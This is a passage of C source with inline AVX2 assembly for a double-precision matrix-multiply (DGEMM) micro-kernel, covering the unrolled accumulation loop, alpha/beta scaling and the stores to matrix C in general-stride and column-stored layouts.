       \\n\\t\" // prefetch c + 1*cs_c\n\t\"prefetcht0   7 * 8(%%rcx,%%rdi,2)           \\n\\t\" // prefetch c + 2*cs_c\n\t\"prefetcht0   7 * 8(%%rcx,%%r13)             \\n\\t\" // prefetch c + 3*cs_c\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"movq      %0, %%rsi                         \\n\\t\" // i = k_iter;\n\t\"testq  %%rsi, %%rsi                         \\n\\t\" // check i via logical AND.\n\t\"je     .DCONSIDKLEFT                        \\n\\t\" // if i == 0, jump to code that\n\t\"                                            \\n\\t\" // contains the k_left loop.\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\".DLOOPKITER:                                \\n\\t\" // MAIN LOOP\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\" // iteration 0\n\t\"prefetcht0  16 * 32(%%rax)                  \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd       0 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm4    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm5    \\n\\t\"\n\t\"vfmadd231pd       %%ymm2, %%ymm3, %%ymm6    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd       1 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm7    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm8    \\n\\t\"\n\t\"vfmadd231pd       %%ymm2, %%ymm3, %%ymm9    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd       2 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm10   \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm11   \\n\\t\"\n\t\"vfmadd231pd       %%ymm2, %%ymm3, %%ymm12   \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd       3 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm13   \\n\\t\"\n\t\"vmovapd            3 * 32(%%rax), %%ymm0    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm14   \\n\\t\"\n\t\"vmovapd            4 * 32(%%rax), %%ymm1    \\n\\t\"\n\t\"vfmadd231pd       %%ymm2, %%ymm3, %%ymm15   \\n\\t\"\n\t\"vmovapd            5 * 32(%%rax), %%ymm2    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\" // iteration 1\n\t\"vbroadcastsd       4 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm4    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm5    \\n\\t\"\n\t\"vfmadd231pd       %%ymm2, %%ymm3, %%ymm6    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd       5 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm7    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm8    \\n\\t\"\n\t\"vfmadd231pd       %%ymm2, %%ymm3, %%ymm9    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd       6 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm10   \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm11   \\n\\t\"\n\t\"vfmadd231pd       %%ymm2, %%ymm3, %%ymm12   \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd       7 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm13   \\n\\t\"\n\t\"vmovapd            6 * 32(%%rax), %%ymm0    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm14   \\n\\t\"\n\t\"vmovapd            7 * 32(%%rax), %%ymm1    \\n\\t\"\n\t\"vfmadd231pd       %%ymm2, %%ymm3, %%ymm15   \\n\\t\"\n\t\"vmovapd            8 * 32(%%rax), %%ymm2    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\" // iteration 2\n\t\"prefetcht0  22 * 32(%%rax)                  \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd       8 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm4    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm5    \\n\\t\"\n\t\"vfmadd231pd       %%ymm2, %%ymm3, %%ymm6    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd       9 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm7    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm8    \\n\\t\"\n\t\"vfmadd231pd       %%ymm2, %%ymm3, %%ymm9    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd      10 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm10   \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm11   \\n\\t\"\n\t\"vfmadd231pd       %%ymm2, %%ymm3, %%ymm12   \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd      11 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm13   \\n\\t\"\n\t\"vmovapd            9 * 32(%%rax), %%ymm0    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm14   \\n\\t\"\n\t\"vmovapd           10 * 32(%%rax), %%ymm1    \\n\\t\"\n\t\"vfmadd231pd       %%ymm2, %%ymm3, %%ymm15   \\n\\t\"\n\t\"vmovapd           11 * 32(%%rax), %%ymm2    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\" // iteration 3\n\t\"vbroadcastsd      12 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm4    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm5    \\n\\t\"\n\t\"vfmadd231pd       %%ymm2, %%ymm3, %%ymm6    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd      13 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm7    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm8    \\n\\t\"\n\t\"vfmadd231pd       %%ymm2, %%ymm3, %%ymm9    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd      14 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm10   \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm11   \\n\\t\"\n\t\"vfmadd231pd       %%ymm2, %%ymm3, %%ymm12   \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd      15 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm13   \\n\\t\"\n\t\"vmovapd           12 * 32(%%rax), %%ymm0    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm14   \\n\\t\"\n\t\"vmovapd           13 * 32(%%rax), %%ymm1    \\n\\t\"\n\t\"vfmadd231pd       %%ymm2, %%ymm3, %%ymm15   \\n\\t\"\n\t\"vmovapd           14 * 32(%%rax), %%ymm2    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"addq          $4 * 12 * 8, %%rax            \\n\\t\" // a += 4*12 (unroll x mr)\n\t\"addq          $4 *  4 * 8, %%rbx            \\n\\t\" // b += 4*4  (unroll x nr)\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"decq   %%rsi                                \\n\\t\" // i -= 1;\n\t\"jne    .DLOOPKITER                          \\n\\t\" // iterate again if i != 0.\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\".DCONSIDKLEFT:                              \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"movq      %1, %%rsi                         \\n\\t\" // i = k_left;\n\t\"testq  %%rsi, %%rsi                         \\n\\t\" // check i via logical AND.\n\t\"je     .DPOSTACCUM                          \\n\\t\" // if i == 0, we're done; jump to end.\n\t\"                                            \\n\\t\" // else, we prepare to enter k_left loop.\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\".DLOOPKLEFT:                                \\n\\t\" // EDGE LOOP\n\t\"                                            \\n\\t\"\n\t\"prefetcht0  16 * 32(%%rax)                  \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd       0 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm4    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm5    \\n\\t\"\n\t\"vfmadd231pd       %%ymm2, %%ymm3, %%ymm6    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd       1 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm7    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm8    \\n\\t\"\n\t\"vfmadd231pd       %%ymm2, %%ymm3, %%ymm9    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd       2 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm10   \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm11   \\n\\t\"\n\t\"vfmadd231pd       %%ymm2, %%ymm3, %%ymm12   \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd       3 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm13   \\n\\t\"\n\t\"vmovapd            3 * 32(%%rax), %%ymm0    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm14   \\n\\t\"\n\t\"vmovapd            4 * 32(%%rax), %%ymm1    \\n\\t\"\n\t\"vfmadd231pd       %%ymm2, %%ymm3, %%ymm15   \\n\\t\"\n\t\"vmovapd            5 * 32(%%rax), %%ymm2    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"addq          $1 * 12 * 8, %%rax            \\n\\t\" // a += 1*12 (unroll x mr)\n\t\"addq          $1 *  4 * 8, %%rbx            \\n\\t\" // b += 1*4  (unroll x nr)\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"decq   %%rsi                                \\n\\t\" // i -= 1;\n\t\"jne    .DLOOPKLEFT                          \\n\\t\" // iterate again if i != 0.\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\".DPOSTACCUM:                                \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"movq         %4, %%rax                      \\n\\t\" // load address of alpha\n\t\"movq         %5, %%rbx                      \\n\\t\" // load address of beta \n\t\"vbroadcastsd    (%%rax), %%ymm0             \\n\\t\" // load alpha and duplicate\n\t\"vbroadcastsd    (%%rbx), %%ymm3             \\n\\t\" // load beta and duplicate\n\t\"                                            \\n\\t\"\n\t\"vmulpd           %%ymm0,  %%ymm4,  %%ymm4   \\n\\t\" // scale by alpha\n\t\"vmulpd           %%ymm0,  %%ymm5,  %%ymm5   \\n\\t\"\n\t\"vmulpd           %%ymm0,  %%ymm6,  %%ymm6   \\n\\t\"\n\t\"vmulpd           %%ymm0,  %%ymm7,  %%ymm7   \\n\\t\"\n\t\"vmulpd           %%ymm0,  %%ymm8,  %%ymm8   \\n\\t\"\n\t\"vmulpd           %%ymm0,  %%ymm9,  %%ymm9   \\n\\t\"\n\t\"vmulpd           %%ymm0,  %%ymm10, %%ymm10  \\n\\t\"\n\t\"vmulpd           %%ymm0,  %%ymm11, %%ymm11  \\n\\t\"\n\t\"vmulpd           %%ymm0,  %%ymm12, %%ymm12  \\n\\t\"\n\t\"vmulpd           %%ymm0,  %%ymm13, %%ymm13  \\n\\t\"\n\t\"vmulpd           %%ymm0,  %%ymm14, %%ymm14  \\n\\t\"\n\t\"vmulpd           %%ymm0,  %%ymm15, %%ymm15  \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"movq                %7, %%rsi               \\n\\t\" // load rs_c\n\t\"leaq        (,%%rsi,8), %%rsi               \\n\\t\" // rsi = rs_c * sizeof(double)\n\t\"                                            \\n\\t\"\n\t\"leaq   (%%rcx,%%rsi,4), %%rdx               \\n\\t\" // rdx = c +  4*rs_c;\n\t\"leaq   (%%rcx,%%rsi,8), %%r12               \\n\\t\" // r12 = c +  8*rs_c;\n\t\"                                            \\n\\t\"\n\t\"leaq   (%%rsi,%%rsi,2), %%r13               \\n\\t\" // r13 = 3*rs_c;\n\t//\"leaq   (%%rsi,%%rsi,4), %%r15               \\n\\t\" // r15 = 5*rs_c;\n\t//\"leaq   (%%r13,%%rsi,4), %%r10               \\n\\t\" // r10 = 7*rs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\" // determine if\n\t\"                                            \\n\\t\" //    c    % 32 == 0, AND\n\t\"                                            \\n\\t\" //  8*cs_c % 32 == 0, AND\n\t\"                                            \\n\\t\" //    rs_c      == 1\n\t\"                                            \\n\\t\" // ie: aligned, ldim aligned, and\n\t\"                                            \\n\\t\" // column-stored\n\t\"                                            \\n\\t\"\n\t\"cmpq       $8, %%rsi                        \\n\\t\" // set ZF if (8*rs_c) == 8.\n\t\"sete           %%bl                         \\n\\t\" // bl = ( ZF == 1 ? 1 : 0 );\n\t\"testq     $31, %%rcx                        \\n\\t\" // set ZF if c & 32 is zero.\n\t\"setz           %%bh                         \\n\\t\" // bh = ( ZF == 0 ? 1 : 0 );\n\t\"testq     $31, %%rdi                        \\n\\t\" // set ZF if (8*cs_c) & 32 is zero.\n\t\"setz           %%al                         \\n\\t\" // al = ( ZF == 0 ? 1 : 0 );\n\t\"                                            \\n\\t\" // and(bl,bh) followed by\n\t\"                                            \\n\\t\" // and(bh,al) will reveal result\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\" // now avoid loading C if beta == 0\n\t\"                                            \\n\\t\"\n\t\"vxorpd    %%ymm0,  %%ymm0,  %%ymm0          \\n\\t\" // set ymm0 to zero.\n\t\"vucomisd  %%xmm0,  %%xmm3                   \\n\\t\" // set ZF if beta == 0.\n\t\"je      .DBETAZERO                          \\n\\t\" // if ZF = 1, jump to beta == 0 case\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\" // check if aligned/column-stored\n\t\"andb     %%bl, %%bh                         \\n\\t\" // set ZF if bl & bh == 1.\n\t\"andb     %%bh, %%al                         \\n\\t\" // set ZF if bh & al == 1.\n\t\"jne     .DCOLSTORED                         \\n\\t\" // jump to column storage case\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\".DGENSTORED:                                \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\tDGEMM_INPUT_GS_BETA_NZ\n\t\"vfmadd213pd      %%ymm4,  %%ymm3,  %%ymm0   \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\tDGEMM_INPUT_GS_BETA_NZ\n\t\"vfmadd213pd      %%ymm7,  %%ymm3,  %%ymm0   \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\tDGEMM_INPUT_GS_BETA_NZ\n\t\"vfmadd213pd      %%ymm10, %%ymm3,  %%ymm0   \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\tDGEMM_INPUT_GS_BETA_NZ\n\t\"vfmadd213pd      %%ymm13, %%ymm3,  %%ymm0   \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t//\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"movq      %%rdx, %%rcx                      \\n\\t\" // rcx = c + 4*rs_c\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\tDGEMM_INPUT_GS_BETA_NZ\n\t\"vfmadd213pd      %%ymm5,  %%ymm3,  %%ymm0   \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\tDGEMM_INPUT_GS_BETA_NZ\n\t\"vfmadd213pd      %%ymm8,  %%ymm3,  %%ymm0   \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\tDGEMM_INPUT_GS_BETA_NZ\n\t\"vfmadd213pd      %%ymm11, %%ymm3,  %%ymm0   \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\tDGEMM_INPUT_GS_BETA_NZ\n\t\"vfmadd213pd      %%ymm14, %%ymm3,  %%ymm0   \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t//\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"movq      %%r12, %%rcx                      \\n\\t\" // rcx = c + 8*rs_c\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\tDGEMM_INPUT_GS_BETA_NZ\n\t\"vfmadd213pd      %%ymm6,  %%ymm3,  %%ymm0   \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\tDGEMM_INPUT_GS_BETA_NZ\n\t\"vfmadd213pd      %%ymm9,  %%ymm3,  %%ymm0   \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\tDGEMM_INPUT_GS_BETA_NZ\n\t\"vfmadd213pd      %%ymm12, %%ymm3,  %%ymm0   \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\tDGEMM_INPUT_GS_BETA_NZ\n\t\"vfmadd213pd      %%ymm15, %%ymm3,  %%ymm0   \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t//\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"jmp    .DDONE                               \\n\\t\" // jump to end.\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\".DCOLSTORED:                                \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovapd    (%%rcx),       %%ymm0            \\n\\t\"\n\t\"vfmadd213pd      %%ymm4,  %%ymm3,  %%ymm0   \\n\\t\"\n\t\"vmovapd          %%ymm0,  (%%rcx)           \\n\\t\"\n\t\"addq      %%rdi, %%rcx                      \\n\\t\"\n\t\"vmovapd    (%%rdx),       %%ymm1            \\n\\t\"\n\t\"vfmadd213pd      %%ymm5,  %%ymm3,  %%ymm1   \\n\\t\"\n\t\"vmovapd          %%ymm1,  (%%rdx)           \\n\\t\"\n\t\"addq      %%rdi, %%rdx                      \\n\\t\"\n\t\"vmovapd    (%%r12),       %%ymm2            \\n\\t\"\n\t\"vfmadd213pd      %%ymm6,  %%ymm3,  %%ymm2   \\n\\t\"\n\t\"vmovapd          %%ymm2,  (%%r12)           \\n\\t\"\n\t\"addq      %%rdi, %%r12                      \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovapd    (%%rcx),       %%ymm0            \\n\\t\"\n\t\"vfmadd213pd      %%ymm7,  %%ymm3,  %%ymm0   \\n\\t\"\n\t\"vmovapd          %%ymm0,  (%%rcx)           \\n\\t\"\n\t\"addq      %%rdi, %%rcx                      \\n\\t\"\n\t\"vmovapd    (%%rdx),       %%ymm1            \\n\\t\"\n\t\"vfmadd213pd      %%ymm8,  %%ymm3,  %%ymm1   \\n\\t\"\n\t\"vmovapd          %%ymm1,  (%%rdx)           \\n\\t\"\n\t\"addq      %%rdi, %%rdx                      \\n\\t\"\n\t\"vmovapd    (%%r12),       %%ymm2            \\n\\t\"\n\t\"vfmadd213pd      %%ymm9,  %%ymm3,  %%ymm2   \\n\\t\"\n\t\"vmovapd          %%ymm2,  (%%r12)           \\n\\t\"\n\t\"addq      %%rdi, %%r12                      \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovapd    (%%rcx),       %%ymm0            \\n\\t\"\n\t\"vfmadd213pd      %%ymm10, %%ymm3,  %%ymm0   \\n\\t\"\n\t\"vmovapd          %%ymm0,  (%%rcx)           \\n\\t\"\n\t\"addq      %%rdi, %%rcx                      \\n\\t\"\n\t\"vmovapd    (%%rdx),       %%ymm1            \\n\\t\"\n\t\"vfmadd213pd      %%ymm11, %%ymm3,  %%ymm1   \\n\\t\"\n\t\"vmovapd          %%ymm1,  (%%rdx)           \\n\\t\"\n\t\"addq      %%rdi, %%rdx                      \\n\\t\"\n\t\"vmovapd    (%%r12),       %%ymm2            \\n\\t\"\n\t\"vfmadd213pd      %%ymm12, %%ymm3,  %%ymm2   \\n\\t\"\n\t\"vmovapd          %%ymm2,  (%%r12)           \\n\\t\"\n\t\"addq      %%rdi, %%r12                      \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovapd    (%%rcx),       %%ymm0            \\n\\t\"\n\t\"vfmadd213pd      %%ymm13, %%ymm3,  %%ymm0   \\n\\t\"\n\t\"vmovapd          %%ymm0,  (%%rcx)           \\n\\t\"\n\t\"addq      %%rdi, %%rcx                      \\n\\t\"\n\t\"vmovapd    (%%rdx),       %%ymm1            \\n\\t\"\n\t\"vfmadd213pd      %%ymm14, %%ymm3,  %%ymm1   \\n\\t\"\n\t\"vmovapd          %%ymm1,  (%%rdx)           \\n\\t\"\n\t\"addq      %%rdi, %%rdx                      \\n\\t\"\n\t\"vmovapd    (%%r12),       %%ymm2            \\n\\t\"\n\t\"vfmadd213pd      %%ymm15, %%ymm3,  %%ymm2   \\n\\t\"\n\t\"vmovapd          %%ymm2,  (%%r12)           \\n\\t\"\n\t\"addq      %%rdi, %%r12                      \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"jmp    .DDONE                               \\n\\t\" // jump to end.\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\".DBETAZERO:                                 \\n\\t\"\n\t\"                                            \\n\\t\" // check if aligned/column-stored\n\t\"andb     %%bl, %%bh                         \\n\\t\" // set ZF if bl & bh == 1.\n\t\"andb     %%bh, %%al                         \\n\\t\" // set ZF if bh & al == 1.\n\t\"jne     .DCOLSTORBZ                         \\n\\t\" // jump to column storage case\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\".DGENSTORBZ:                                \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovapd           %%ymm4,  %%ymm0           \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovapd           %%ymm7,  %%ymm0           \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovapd           %%ymm10, %%ymm0           \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovapd           %%ymm13, %%ymm0           \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t//\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"movq      %%rdx, %%rcx                      \\n\\t\" // rcx = c + 4*rs_c\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovapd           %%ymm5,  %%ymm0           \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovapd           %%ymm8,  %%ymm0           \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovapd           %%ymm11, %%ymm0           \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovapd           %%ymm14, %%ymm0           \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t//\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"movq      %%r12, %%rcx                      \\n\\t\" // rcx = c + 8*rs_c\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovapd           %%ymm6,  %%ymm0           \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovapd           %%ymm9,  %%ymm0           \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovapd           %%ymm12, %%ymm0           \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovapd           %%ymm15, %%ymm0           \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t//\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"jmp    .DDONE                               \\n\\t\" // jump to end.\n\t\"  